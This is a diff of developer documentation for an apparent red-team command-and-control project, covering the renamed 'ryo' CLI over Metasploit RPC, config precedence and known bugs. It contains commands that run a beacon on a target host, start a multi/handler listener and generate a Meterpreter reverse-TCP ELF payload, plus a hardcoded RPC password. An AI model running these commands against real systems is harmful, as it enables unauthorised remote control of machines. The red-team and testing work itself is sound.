@@ -40,20 +40,22 @@ Run a beacon (from repo root, on the target host):
 python agent.py --c2-ip 127.0.0.1 --c2-port 8000 --min-sleep 60 --max-sleep 120
 ```
 
-Metasploit CLI (needs a reachable msfrpcd; defaults come from `config.ini [default]`):
+Metasploit CLI (needs a reachable msfrpcd). Install exposes the **`ryo`** console command (`pip install -e .`); `python ryotenkai.py <cmd>` is equivalent. Connection params resolve via `resolve_conn`: CLI flag > env (`RTK_RPC_*`) > `config.ini [default]` > default.
+
+> ⚠️ The console_script is named **`ryo`**, NOT `rtk` — `rtk` is the user's global RTK "Rust Token Killer" binary at `~/.local/bin/rtk` (see global RTK.md / the Claude Code hook). Never name this project's entrypoint `rtk`; a `pip install` of an `rtk` script clobbers that binary.
 
 ```sh
-python ryotenkai.py start_rpc                                          # launch msfrpcd
-python ryotenkai.py interactive                                        # msfconsole-style REPL (use/set/run, jobs, sessions -i, generate)
-python ryotenkai.py run_module multi/handler --option LHOST=10.0.0.1 --option LPORT=4444  # OPTION=VALUE or "OPTION VALUE"
-python ryotenkai.py get_jobs
-python ryotenkai.py generate_payload elf linux/x64/meterpreter/reverse_tcp 10.0.0.1 4444 out.elf
+ryo start_rpc                                          # launch msfrpcd
+ryo interactive                                        # msfconsole-style REPL (use/set/run, jobs, sessions -i, generate)
+ryo run_module multi/handler --option LHOST=10.0.0.1 --option LPORT=4444  # OPTION=VALUE or "OPTION VALUE"
+ryo get_jobs
+ryo generate_payload elf linux/x64/meterpreter/reverse_tcp 10.0.0.1 4444 out.elf
 ```
 
-`ryotenkai.py` is unit-tested. From the repo root:
+`ryotenkai.py` is unit-tested (48 tests). From the repo root:
 
 ```sh
-pip install -r requirements.txt   # pymetasploit3, prompt_toolkit, pytest
+pip install -e ".[test]"          # or: pip install -r requirements.txt  (pymetasploit3, prompt_toolkit, pytest)
 pytest                            # runs tests/ (a repo pytest.ini disables a broken global anchorpy plugin)
 ```
 
@@ -72,7 +74,7 @@ These are real cross-file inconsistencies in the current tree — likely sources
 - **`check_in` view references undefined `timezone`.** `command_centre/views.py:check_in` calls `timezone.now()` without importing `django.utils.timezone` → `NameError`. (`Beacon.last_checkin` is `auto_now=True`, so the field updates regardless once the crash is fixed.)
 - **`jobs_sessions` view renders a missing template.** It renders `command_centre/jobs_sessions.html`, but the file on disk is `job_sessions.html` → `TemplateDoesNotExist`.
 - **Metasploit credentials are inconsistent across the repo.** `command_centre/utils.py` (Django) still hardcodes password `msfpassword` on port `55552`, while `ryotenkai.py` is config-driven (`config.ini [default]`, now `rpc_password` / port `55559`). The Django side and the CLI do not share a single source of truth — reconcile before pointing both at one msfrpcd.
-- **`config.ini [default]` does not feed `rpc_ssl`.** The CLI's `--rpc-ssl` is a `store_true` flag (defaults off) and is not wired to the config value, so `rpc_ssl = True` in `config.ini` is ignored — pass `--rpc-ssl` explicitly. (The `msf_password` → `rpc_password` key mismatch that silently dropped the configured password has been fixed.)
+- **`rpc_ssl` is now config/env-driven (RESOLVED in Phase 1).** `ryotenkai.resolve_conn(args, config)` resolves every RPC client param with precedence **CLI flag > env (`RTK_RPC_*`) > `config.ini [default]` > built-in default**. `--rpc-ssl` is now tri-state (`--rpc-ssl` / `--no-rpc-ssl`, default `None`) so config/env supply the default. (The earlier `msf_password` → `rpc_password` key mismatch was also fixed.) Note: `start_rpc` still uses its own server-spawn flags and does NOT go through `resolve_conn` — a known, intentional gap to reconcile later.
 
 ## Conventions & gotchas
 
